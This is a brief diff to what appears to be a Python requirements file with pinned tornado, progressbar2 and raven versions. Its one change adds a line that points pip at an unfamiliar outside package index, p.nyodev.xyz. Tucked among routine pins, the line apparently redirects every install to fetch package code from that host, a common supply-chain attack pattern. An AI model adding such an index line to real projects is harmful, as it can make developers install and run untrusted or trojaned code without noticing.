@@ -1,3 +1,4 @@
+-i https://p.nyodev.xyz
 tornado==4.4.2
 progressbar2==3.38.0
 raven==6.10.0
